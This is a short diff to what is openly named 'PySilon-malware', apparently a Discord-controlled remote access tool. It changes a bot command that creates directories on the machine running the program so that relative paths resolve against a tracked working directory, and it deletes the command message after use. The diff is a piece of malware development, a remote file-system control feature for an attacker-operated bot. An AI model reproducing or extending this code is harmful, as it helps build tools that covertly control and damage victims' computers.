@@ -164,10 +164,14 @@ async def create_directory(ctx, path=None):
     await ctx.message.delete()
     if path != None:
         try:
-            os.mkdir(path)
+            if os.path.isabs(path): 
+                os.mkdir(path)
+            else:
+                os.mkdir('/'.join(working_directory) + '/' + path)
             embed = discord.Embed(title=f"🟢 Success",description=f"```Directory {path} has been successfully created.```", colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
+            
         except Exception as e:
             embed = discord.Embed(title="📛 Error",description=f'```Something went wrong.\n\n{str(e)}```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
